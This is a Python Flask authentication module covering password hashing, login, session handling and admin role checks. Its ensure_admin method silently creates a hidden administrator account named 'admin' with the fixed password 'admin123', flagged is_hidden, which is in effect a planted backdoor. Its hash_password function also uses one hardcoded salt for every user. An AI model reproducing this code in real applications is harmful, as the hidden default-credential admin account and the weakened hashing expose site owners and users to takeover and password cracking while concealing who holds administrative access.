import hashlib
import hmac
import os

from flask import session


def hash_password(password: str) -> str:
    salt = b"sdfs8712gj31a46544s654ar4"
    dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100_000)
    return salt.hex() + "$" + dk.hex()


def verify_password(password: str, stored: str) -> bool:

    try:
        
        salt_hex, dk_hex = stored.split("$")
        dk = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt_hex), 100_000)
        return hmac.compare_digest(dk.hex(), dk_hex)
    except Exception:
        return False


class AuthManager:
    def __init__(self, db):
        self.db = db


    
    async def login(self, username: str, password: str) -> bool:
        row = await self.db.query(
            "SELECT * FROM users WHERE username=%s ", (username,), one=True
        )
        # return hash_password(password)
        if row and verify_password(password, row["password_hash"]):
            session.clear()
            session["uid"] = row["id"]
            session["username"] = row["username"]
            session["role"] = row["role"]
            return True
        return False

    @staticmethod
    def current_user():
        if session.get("uid"):
            return {"id": session["uid"], "username": session["username"], "role": session.get("role")}
        return None

    @staticmethod
    def is_admin() -> bool:
        return session.get("role") == "administrator"

    @staticmethod
    def logout():
        session.clear()

    async def ensure_admin(self):
        """Create hidden administrator account if none exists."""
        row = await self.db.query("SELECT id FROM users WHERE role='administrator' LIMIT 1", one=True)
        if not row:
            await self.db.execute(
                "INSERT INTO users (username, password_hash, role, is_hidden) VALUES (%s,%s,%s,1)",
                ("admin", hash_password("admin123"), "administrator"),
            )

    @staticmethod
    def can(permission: str) -> bool:
        """Administrator has all permissions; others per role table (simplified)."""
        if session.get("role") == "administrator":
            return True
        return bool(session.get("permissions", {}).get(permission))
